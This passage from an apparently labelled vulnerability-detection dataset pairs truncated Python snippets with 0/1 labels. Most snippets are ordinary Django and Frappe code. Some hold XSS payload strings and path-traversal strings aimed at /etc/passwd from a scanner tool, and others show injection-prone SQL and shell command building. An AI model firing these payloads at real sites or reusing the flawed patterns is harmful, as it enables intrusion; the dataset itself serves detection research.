coordinator_id=request.GET.get('coordinator", "label": 0}, {"snippet_id": 18843, "code": "( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id", "label": 0}, {"snippet_id": 30765, "code": "/a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' ' +backend \tfunct", "label": 0}, {"snippet_id": 38701, "code": ") \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance", "label": 0}, {"snippet_id": 12508, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 33978, "code": "(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom", "label": 0}, {"snippet_id": 35631, "code": "{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:", "label": 0}, {"snippet_id": 16915, "code": ", 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses", "label": 0}, {"snippet_id": 15603, "code": " self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course", "label": 0}, {"snippet_id": 38913, "code": " key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]:", "label": 0}, {"snippet_id": 41440, "code": " comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t", "label": 0}, {"snippet_id": 24728, "code": " the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`", "label": 0}, {"snippet_id": 13437, "code": "]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$", "label": 0}, {"snippet_id": 33988, "code": "\t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s", "label": 0}, {"snippet_id": 8366, "code": "'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task", "label": 0}, {"snippet_id": 40473, "code": " string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t", "label": 0}, {"snippet_id": 51287, "code": ".site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins', 'internet_nl_api_username", "label": 0}, {"snippet_id": 50445, "code": "[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries.pop(0) request.notifyFinish().addErrback(self._responseFailed, csessid, request) if csessid", "label": 0}, {"snippet_id": 28920, "code": " else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn", "label": 0}, {"snippet_id": 35051, "code": "\t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t ", "label": 0}, {"snippet_id": 22726, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=", "label": 0}, {"snippet_id": 46229, "code": " DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request", "label": 0}, {"snippet_id": 13177, "code": "'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done", "label": 0}, {"snippet_id": 43946, "code": "(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)", "label": 0}, {"snippet_id": 9927, "code": " edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug", "label": 0}, {"snippet_id": 4729, "code": "'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', ", "label": 0}, {"snippet_id": 7146, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'})", "label": 0}, {"snippet_id": 47083, "code": "'updated', 'created',) column_details_list=('id', 'version_id', 'updated', 'created', 'json') column_labels=dict( id=_('UUID'), version_id=_('Revision'), json=_('JSON'), ) column_formatters=dict( version_id", "label": 0}, {"snippet_id": 40538, "code": "\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and", "label": 0}, {"snippet_id": 13778, "code": "'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book", "label": 1}, {"snippet_id": 11330, "code": "?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to':", "label": 0}, {"snippet_id": 16728, "code": "<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index'", "label": 1}, {"snippet_id": 19858, "code": " kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE", "label": 0}, {"snippet_id": 2820, "code": ".text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 0}, {"snippet_id": 52100, "code": " workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie", "label": 0}, {"snippet_id": 30796, "code": "\tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('/show_compare_configs.html') \tleft=form.getvalue('left') \tright", "label": 1}, {"snippet_id": 26452, "code": "\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../..", "label": 0}, {"snippet_id": 32566, "code": ") if not full_path.startswith(self.server.top_level): self._DoUnknown() elif path in('/base.css', '/doc.css', '/prettify.css'): self._DoCSS(path[1:]) elif not os.path.exists(full_path): self._DoNotFound", "label": 0}, {"snippet_id": 41587, "code": " import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype", "label": 0}, {"snippet_id": 54590, "code": "(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by", "label": 0}, {"snippet_id": 807, "code": " result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if", "label": 1}, {"snippet_id": 11146, "code": "\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000)", "label": 0}, {"snippet_id": 44562, "code": "=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description", "label": 0}, {"snippet_id": 54063, "code": ".get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get(", "label": 0}, {"snippet_id": 20712, "code": "'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student", "label": 0}, {"snippet_id": 10068, "code": "-verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules", "label": 0}, {"snippet_id": 40349, "code": "(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{", "label": 0}, {"snippet_id": 22176, "code": ", name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$'", "label": 0}, {"snippet_id": 30534, "code": ") \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep", "label": 0}, {"snippet_id": 49645, "code": ") or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model", "label": 0}, {"snippet_id": 45947, "code": " can_edit_index LOG=logging.getLogger(__name__) DEFAULT_LAYOUT=[ {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":", "label": 0}, {"snippet_id": 50915, "code": ".fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin", "label": 0}, {"snippet_id": 37228, "code": " frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t", "label": 0}, {"snippet_id": 33369, "code": "/cron/buildbucket/delete_builds', expiration.CronDeleteBuilds), webapp2.Route(r'/internal/cron/buildbucket/update_buckets', CronUpdateBuckets), webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod", "label": 0}, {"snippet_id": 24358, "code": " test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is", "label": 0}, {"snippet_id": 41729, "code": " \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in", "label": 0}, {"snippet_id": 6446, "code": " 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section, 'userdb_mongo_uri') @property", "label": 0}, {"snippet_id": 16864, "code": "/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section", "label": 0}, {"snippet_id": 3469, "code": "(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\"", "label": 0}, {"snippet_id": 42667, "code": "\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields", "label": 0}, {"snippet_id": 19318, "code": "='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite", "label": 0}, {"snippet_id": 12608, "code": "/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +", "label": 0}, {"snippet_id": 53389, "code": " 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission", "label": 0}, {"snippet_id": 45865, "code": " deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties)", "label": 0}, {"snippet_id": 45821, "code": "])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request", "label": 0}, {"snippet_id": 48755, "code": ".get(id=int(request.GET[\"id\"])) r: GroupReservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) if(aid.RID.createdByUser==u or u.rights > 1) and aid.RID==r and not r.submitted: aid.delete(", "label": 0}, {"snippet_id": 11538, "code": ".views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$'", "label": 0}, {"snippet_id": 28625, "code": "=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies ", "label": 0}, {"snippet_id": 6972, "code": "', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r", "label": 0}, {"snippet_id": 33881, "code": "\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route", "label": 0}, {"snippet_id": 19722, "code": " test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite)", "label": 0}, {"snippet_id": 20412, "code": ".pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff", "label": 0}, {"snippet_id": 41500, "code": "=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment'", "label": 0}, {"snippet_id": 29574, "code": "=\"1\": \t\t\tshow_log(stdout) \t\telif kwargs.get(\"server_status\")==\"1\": \t\t\tserver_status(stdout) \t\telif kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode", "label": 0}, {"snippet_id": 17365, "code": "( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider", "label": 0}, {"snippet_id": 22200, "code": "', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views", "label": 0}, {"snippet_id": 5035, "code": " formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video>", "label": 0}, {"snippet_id": 22036, "code": ".MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url", "label": 0}, {"snippet_id": 8145, "code": ".ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin", "label": 0}, {"snippet_id": 26323, "code": " vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning", "label": 0}, {"snippet_id": 20603, "code": " one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views", "label": 0}, {"snippet_id": 22475, "code": ".render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render'", "label": 0}, {"snippet_id": 23619, "code": " settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), )", "label": 0}, {"snippet_id": 23295, "code": ".news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug", "label": 0}, {"snippet_id": 34294, "code": " default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): ", "label": 0}, {"snippet_id": 22252, "code": " 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]", "label": 0}, {"snippet_id": 41457, "code": "\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length,", "label": 0}, {"snippet_id": 24843, "code": " print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string", "label": 0}, {"snippet_id": 9892, "code": ".MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url", "label": 0}, {"snippet_id": 8995, "code": ".user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name=", "label": 0}, {"snippet_id": 53131, "code": ".id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request", "label": 0}, {"snippet_id": 1929, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True", "label": 0}, {"snippet_id": 46839, "code": ": await self.set_content(content) return await super().save(*args, **kwargs) @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async", "label": 0}, {"snippet_id": 15887, "code": "?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to':", "label": 0}, {"snippet_id": 3521, "code": " xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?", "label": 0}, {"snippet_id": 19949, "code": "() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files", "label": 0}, {"snippet_id": 9457, "code": "/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups", "label": 0}, {"snippet_id": 54809, "code": "=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request", "label": 0}, {"snippet_id": 8664, "code": "), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME", "label": 0}, {"snippet_id": 21092, "code": "]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to", "label": 0}, {"snippet_id": 20087, "code": ": substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit", "label": 0}, {"snippet_id": 50332, "code": " csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(", "label": 0}, {"snippet_id": 18791, "code": ", include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 28431, "code": "='logs': \t\tfmt='%Y%m%d' \tif type==\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var", "label": 0}, {"snippet_id": 29355, "code": "\"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\"", "label": 0}, {"snippet_id": 7141, "code": "'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=", "label": 0}, {"snippet_id": 44541, "code": "', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name", "label": 0}, {"snippet_id": 46215, "code": "} }) else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines", "label": 0}, {"snippet_id": 9108, "code": "]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 29778, "code": " import sql import ovw form=cgi.FieldStorage() serv=form.getvalue('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor", "label": 0}, {"snippet_id": 8641, "code": "'auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete", "label": 0}, {"snippet_id": 22809, "code": "[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+", "label": 1}, {"snippet_id": 16886, "code": "*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses", "label": 0}, {"snippet_id": 53222, "code": ".errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet", "label": 0}, {"snippet_id": 32321, "code": ".file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url)", "label": 0}, {"snippet_id": 3174, "code": " not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body", "label": 0}, {"snippet_id": 38336, "code": "\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s ", "label": 0}, {"snippet_id": 42049, "code": "])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\"", "label": 0}, {"snippet_id": 50175, "code": " and/or sends it to the client as soon as possible. Args: csessid(int): Session id. data(list): A send structure[cmdname,[args],{kwargs}]. \"\"\" request=self.requests.get(csessid) if request: request.write", "label": 0}, {"snippet_id": 35869, "code": "\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): 